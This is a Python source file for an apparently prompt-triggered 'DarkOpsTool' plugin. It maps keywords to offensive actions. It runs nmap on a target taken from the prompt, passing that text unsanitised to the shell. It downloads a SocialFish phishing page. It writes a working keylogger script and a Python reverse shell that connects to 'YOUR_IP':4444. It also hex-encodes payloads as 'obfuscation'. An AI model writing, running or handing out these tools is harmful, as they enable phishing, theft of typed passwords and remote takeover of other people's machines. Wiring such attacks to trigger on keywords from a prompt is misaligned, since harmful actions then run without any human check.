# tools/dark_ops.py

import os
import subprocess
import requests
from tools.base import BaseTool

class DarkOpsTool(BaseTool):
    def match(self, prompt):
        return any(keyword in prompt.lower() for keyword in [
            "recon", "scan", "exploit", "phishing", "malware", "keylogger", "reverse shell"
        ])

    def execute(self, prompt):
        if "recon" in prompt:
            return self.perform_recon(prompt)
        elif "phishing" in prompt:
            return self.launch_phishing(prompt)
        elif "keylogger" in prompt:
            return self.deploy_keylogger()
        elif "reverse shell" in prompt:
            return self.reverse_shell_generator()
        elif "obfuscate" in prompt:
            return self.payload_obfuscation(prompt)
        else:
            return "[!] No matching dark operation found."

    def perform_recon(self, prompt):
        domain = prompt.split()[-1]
        output = subprocess.getoutput(f"nmap -sV -Pn {domain}")
        return f"Recon result for {domain}:\n{output}"

    def launch_phishing(self, prompt):
        template_url = "https://raw.githubusercontent.com/UndeadSec/SocialFish/master/index.html"
        html = requests.get(template_url).text
        path = os.path.join(os.getcwd(), "phish_page.html")
        with open(path, "w") as f:
            f.write(html)
        return f"[+] Phishing page saved to: {path}"

    def deploy_keylogger(self):
        script = """
import pynput.keyboard
import logging

log_dir = "keylogs.txt"
logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info('Key {0} pressed.'.format(key.char))
    except AttributeError:
        logging.info('Special Key {0} pressed.'.format(key))

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
"""
        path = os.path.join(os.getcwd(), "keylogger.py")
        with open(path, "w") as f:
            f.write(script)
        return f"[+] Keylogger written to: {path}"

    def reverse_shell_generator(self):
        shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('YOUR_IP',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""
        path = os.path.join(os.getcwd(), "rev_shell.py")
        with open(path, "w") as f:
            f.write(shell)
        return f"[+] Reverse shell script saved to: {path}"

    def payload_obfuscation(self, prompt):
        payload = prompt.split("::")[-1].strip()
        b64 = payload.encode("utf-8").hex()
        return f"Obfuscated hex payload: {b64}"

tool = DarkOpsTool()
